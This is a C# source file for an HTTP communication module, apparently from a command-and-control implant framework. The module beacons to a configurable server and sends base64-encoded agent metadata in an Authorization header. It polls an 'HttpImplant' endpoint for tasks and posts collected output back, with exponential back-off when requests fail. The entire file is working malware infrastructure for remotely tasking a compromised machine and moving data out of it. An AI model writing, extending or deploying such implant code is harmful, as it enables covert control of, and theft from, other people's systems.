using AgentClient.Domain.Models.Agents;
using AgentClient.Infrastructure.DTOs;
using AgentClient.Infrastructure.Extensions;
using System.Text;

namespace AgentClient.Infrastructure.CommModules
{
    public class HttpCommModule : CommModule
    {
        public string ConnectAddress { get; set; }
        public int ConnectPort { get; set; }

        private readonly Agent _agent;

        private CancellationTokenSource _tokenSource;
        private HttpClient? _client;

        public HttpCommModule(string connectAddress, int connectPort, Agent agent)
        {
            ConnectAddress = connectAddress;
            ConnectPort = connectPort;
            _agent = agent;
        }

        public override void Initialiser(AgentMetadata metadata)
        {
            base.Initialiser(metadata);

            _client = new HttpClient();
            _client.BaseAddress = new Uri($"{ConnectAddress}:{ConnectPort}/");
            _client.DefaultRequestHeaders.Clear();

            var dto = _agent.Dto();
            var encodedMetadata = Convert.ToBase64String(dto.Serialise());
            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
        }

        public override async Task Start()
        {
            _tokenSource = new CancellationTokenSource();
            var delayMs = 1000;
            
            while (!_tokenSource.IsCancellationRequested)
            {
                try
                {
                    if (!Outbound.IsEmpty)
                    {
                        await PostData();
                    }
                    else
                    {
                        await CheckIn();
                    }

                    delayMs = 1000;
                }
                catch
                {
                    delayMs = Math.Min(delayMs * 2, 30000);
                }

                await Task.Delay(delayMs, _tokenSource.Token);
            }
        }

        public override async Task Stop()
        {
            _tokenSource.Cancel();

            _client?.Dispose();
            _client = null;

            await Task.CompletedTask;
        }


        private async Task CheckIn()
        {
            var response = await _client.GetByteArrayAsync("HttpImplant");
            HandleResponse(response);
        }

        private void HandleResponse(byte[] response)
        {
            var tasks = response.Deserialise<AgentTask[]>();
            if (tasks != null && tasks.Any())
            {
                foreach (var task in tasks)
                {
                    Inbound.Enqueue(task);
                }
            }
        }

        private async Task PostData()
        {
            var outbound = GetOutbound().Serialise();

            var content = new StringContent(Encoding.UTF8.GetString(outbound), Encoding.UTF8, "application/json");
            var response = await _client.PostAsync("HttpImplant", content);
            var contentResponse = await response.Content.ReadAsByteArrayAsync();

            HandleResponse(contentResponse);
        }
    }
}
